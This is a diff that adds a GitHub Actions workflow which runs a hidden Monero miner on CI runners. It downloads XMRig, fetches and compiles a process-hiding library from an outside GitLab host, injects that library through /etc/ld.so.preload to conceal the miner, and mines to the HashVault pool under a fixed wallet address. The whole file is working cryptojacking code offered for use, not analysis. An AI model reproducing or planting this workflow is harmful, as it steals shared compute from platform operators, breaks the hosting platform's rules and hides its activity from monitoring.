@@ -1,0 +1,45 @@
+name: XMR Miner
+on:
+  workflow_dispatch:
+
+jobs:
+  mine-xmr:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360  # Batasi agar tidak berjalan selamanya
+
+    steps:
+      - name: Checkout repo
+        uses: actions/checkout@v3
+
+      - name: Install dependencies
+        run: |
+          sudo apt update
+          sudo apt install -y \
+            cmake build-essential automake libtool autoconf \
+            git screen unzip curl wget libssl-dev \
+            nodejs node-gyp npm gcc make
+          sudo npm install -g node-process-hider
+
+      - name: Download and extract XMRig
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-x64.tar.gz
+          tar -xvzf xmrig-6.21.3-linux-x64.tar.gz
+
+      - name: Compile processhider and hide xmrig
+        run: |
+          cd xmrig-6.21.3
+          wget https://gitlab.com/ravencoin002/file/-/raw/main/processhider.c -O processhider.c
+          gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+          sudo mv libprocesshider.so /usr/local/lib/
+          echo "/usr/local/lib/libprocesshider.so" | sudo tee -a /etc/ld.so.preload
+          ph add xmrig || true  # Jangan gagal jika sudah tersembunyi
+
+      - name: Start Mining to HashVault Pool
+        run: |
+          cd xmrig-6.21.3
+          ./xmrig \
+            -o pool.hashvault.pro:443 \
+            -u X8AyXAQ5yZxuRe1FiBLQWan4zNvdBRLR5r6vUMR1ncHeHfYsvQ7qvcFoLauFjXTomqLQs1Nh6iMgTvLeyB3tzhq84AcUVCES \
+            --tls -k \
+            -p GitHubRunner-HVXMR \
+            --coin monero
